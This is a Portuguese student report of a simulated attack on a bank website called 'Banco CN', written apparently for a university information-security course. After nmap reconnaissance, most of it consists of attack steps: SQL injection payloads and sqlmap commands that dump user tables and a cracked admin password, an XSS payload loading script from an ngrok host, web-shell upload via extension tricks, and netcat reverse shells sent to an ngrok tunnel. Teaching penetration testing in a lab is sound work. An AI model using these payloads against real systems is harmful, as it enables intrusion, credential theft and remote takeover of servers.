# Relatório do Ataque ao Banco CN

Esse é um relatório de um ataque ao Banco CN, que foi feito para a disciplina de Segurança da Informação, do curso de Ciência da Computação da Universidade Federal de Lavras.
O ataque foi feito em um ambiente controlado, com o objetivo de simular um ataque real, e assim, poder aprender mais sobre segurança da informação.

## Informações:

Email: <contato@bancocn.com>
Tel: +835 66 7070, se nao der certo 70 de novo
<emprestimos@bancocn.com>

<www.bancocn.com/admin>

### Uso de whois para descobrir mais ips

### ip da cloudFlare - waf00f - ve se tem firewall

bancocn.com has address 172.67.192.199
bancocn.com has address 104.21.52.8

### subdomínios

shop.bancocn.com.
172.18.100.7

www.bancocn.com.
172.67.192.199

www.bancocn.com.
104.21.52.8

### usando sudo nmap

PORT     STATE SERVICE
80/tcp   open  http
443/tcp  open  https
8080/tcp open  http-proxy
8443/tcp open  https-alt

### usando o sudo -O nmap para pegar o sistema operacional

Device type: bridge|general purpose|switch
Running (JUST GUESSING): Oracle VirtualBox (98%), QEMU (93%), Bay Networks embedded (88%)

### serviços totais

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Cloudflare http proxy
|_http-title: Did not follow redirect to http://www.bancocn.com/
|_http-server-header: cloudflare
443/tcp  open  ssl/https     cloudflare
|_http-title: 400 The plain HTTP request was sent to HTTPS port
|_http-server-header: cloudflare
8080/tcp open  http          Cloudflare http proxy
|_http-title: Did not follow redirect to http://www.bancocn.com/
|_http-server-header: cloudflare
8443/tcp open  ssl/https-alt cloudflare
|_http-title: 400 The plain HTTP request was sent to HTTPS port
|_http-server-header: cloudflare
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: bridge|general purpose|switch
Running (JUST GUESSING): Oracle Virtualbox (98%), QEMU (93%), Bay Networks embedded (88%)
OS CPE: cpe:/o:oracle:virtualbox cpe:/a:qemu:qemu cpe:/h:baynetworks:baystack_450
Aggressive OS guesses: Oracle Virtualbox (98%), QEMU user mode network gateway (93%), Bay Networks BayStack 450 switch (software version 3.1.0.22) (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

### Information Disclorsure

Apache/2.4.29 (Ubuntu) Server at www.bancocn.com Port 80

### Directory: http://www.bancocn.com/assets

## SQL injection

www.bancocn.com/cat.php?id=-1 union select 1,2,group_concat(login) from users
retorna: admin

www.bancocn.com/cat.php?id=-1 union select 1,2,group_concat(password) from users
retorna: 
7b71be0e85318117d2e514ce2a2e222c
(hash da senha - não consegue descriptografar, apenas com ataque bruto)

Por meio do hash killer
Senha é: senhafoda

Para automatizar, a gente pode usar o comando sqlmap

sqlmap -u "http://bancocn.com/cat.php?id=1" 

sqlmap -r header.txt -D bancocn -tables

sqlmap -r header.txt -D bancocn -T users --collumns

sqlmap -r header.txt -D bancocn -T users -C login, password --dump

sqlmap -r header.txt --dump-all

## Ataque XXS

python3 -m http.server
Mas  é melhor usar o site ngrok

Depois colocamos na url:
www.bancocn.com/cat.php?id=2'<script src="https://d97d-45-229-123-11.ngrok-free.app/script.js"></script>

## Fazendo upload de shell
Utilizando variaveis de extensão para passar pela verificação, exemplos:
.php7
.php5
.html.php
.jpg.php

http://www.bancocn.com/admin/uploads/shell.php7?cmd=ls

## Agora vamos conectar o servidor com a nossa maquina

Começamos com o comando:
nc -lvp 789 // no servidor do atacante
nc 127.0.0.1 789 -e /bin/bash // no servidor do atacado = executar o bash

### Usando o ngrok para fazer o tunelamento

./ngrok tcp 789

tcp://0.tcp.sa.ngrok.io:15096

Depois no url:
www.bancocn.com/admin/uploads/shell.php7?cmd=nc 0.tcp.sa.ngrok.io 14745 -e /bin/bash